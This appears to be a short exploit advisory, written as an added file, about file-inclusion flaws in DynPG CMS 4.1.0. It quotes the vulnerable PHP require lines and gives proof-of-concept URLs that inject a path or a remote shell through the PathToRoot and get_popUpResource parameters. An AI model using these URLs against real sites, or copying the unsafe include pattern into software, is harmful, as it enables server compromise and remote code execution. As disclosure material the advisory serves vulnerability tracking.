@@ -1,0 +1,88 @@
+########################################################
+	DynPG CMS v4.1.0 Multiple Vulnerability
+########################################################
+ 
+    fucking the Web Apps [attack edition]
+ 
+ ____                  __                              __    __               
+/\  _`\               /\ \      __                    /\ \__/\ \              
+\ \ \L\_\__  __    ___\ \ \/'\ /\_\    ___      __    \ \ ,_\ \ \___      __  
+ \ \  _\/\ \/\ \  /'___\ \ , < \/\ \ /' _ `\  /'_ `\   \ \ \/\ \  _ `\  /'__`\
+  \ \ \/\ \ \_\ \/\ \__/\ \ \\`\\ \ \/\ \/\ \/\ \L\ \   \ \ \_\ \ \ \ \/\  __/
+   \ \_\ \ \____/\ \____\\ \_\ \_\ \_\ \_\ \_\ \____ \   \ \__\\ \_\ \_\ \____\
+    \/_/  \/___/  \/____/ \/_/\/_/\/_/\/_/\/_/\/___L\ \   \/__/ \/_/\/_/\/____/
+                                                /\____/                       
+                                                \_/__/                        
+ __      __          __          ______                       Hack0wn! Security Project    
+/\ \  __/\ \        /\ \        /\  _  \                          
+\ \ \/\ \ \ \     __\ \ \____   \ \ \L\ \  _____   _____     ____ 
+ \ \ \ \ \ \ \  /'__`\ \ '__`\   \ \  __ \/\ '__`\/\ '__`\  /',__\
+  \ \ \_/ \_\ \/\  __/\ \ \L\ \   \ \ \/\ \ \ \L\ \ \ \L\ \/\__, `\
+   \ `\___x___/\ \____\\ \_,__/    \ \_\ \_\ \ ,__/\ \ ,__/\/\____/
+    '\/__//__/  \/____/ \/___/      \/_/\/_/\ \ \/  \ \ \/  \/___/
+                                             \ \_\   \ \_\        
+                                              \/_/    \/_/         
+
+
+[+]Title	:	DynPG CMS v4.1.0 Multiple Vulnerability
+[+]Version:	4.1.0 (Other or lower versions may also be affected)
+[+]Download:	http://www.dynpg.org/download_en.php
+[+]License:	GNU / GPL
+[+]Metode :	Remote File Inclusion
+[+]Author:	eidelweiss
+
+	[*]Special to Syabilla_putri (I miss u so much to)[*]
+
+	[!]Thank`s Fly To:
+
+[~] Jose Luis Gongora Fernandez a.k.a JosS
+[~] exploit-db team
+[~] Inj3ct0r.com r0073r & 0x1D [Inj3ct0r Exploit Database], [D]eal [C]yber
+
+########################################################
+
+Description:
+
+DynPG is used to upload and manage dynamic web content similar to other content management systems.
+DynPG however differs from other CMS, because it is embedded directly into websites.
+The software was originally developed to realize designs that are created with Adobe Photoshop, Adobe Fireworks, Adobe Illustrator or any other graphics software.
+The layout is created with an editor like Adobe Dreamweaver or Adobe GoLive or even as simple code.
+After that, code snippets are placed at those points, where dynamically generated content (like articles, galleries, blogs or other dynamic content) shall be generated.
+It provides a convenient way to extend existing websites with dynamic content. DynPG provides a template engine, but also supports existing CSS layouts.
+
+########################################################
+
+	-=[ Vuln C0de ]=-
+
+[!] counter.php
+
+		require_once $GLOBALS["DefineRootToTool"]."config.php";	// line 15
+		require_once $GLOBALS["DefineRootToTool"]."connectdb.php";	// line 16
+
+
+[!] /plugins/DPGguestbook/guestbookaction.php
+
+<?php
+    function dynPG_Guestbook_proceedREQ()
+    {
+      require_once $GLOBALS['DynPG']->PathToRoot .'config.php';
+      require_once $GLOBALS['DynPG']->PathToRoot .'defines.php';
+      require_once $GLOBALS['DynPG']->PathToRoot .'connectdb.php';
+
+
+[!] /backendpopup/popup.php
+
+	require './resources/' . $get_popUpResource . '/index.res.php';	// line 36
+
+[!] etc , etc , etc
+
+
+	-=[ Proof Of Concept ]=-
+	
+	http://127.0.0.1/DynPG_path/plugins/DPGguestbook/guestbookaction.php?PathToRoot= [LFI]
+
+	http://127.0.0.1/DynPG_path/backendpopup/popup.php?get_popUpResource= [inj3ct0r sh3ll] <-- RFI
+
+	etc , etc , etc
+	
+######################=[E0F]=#############################
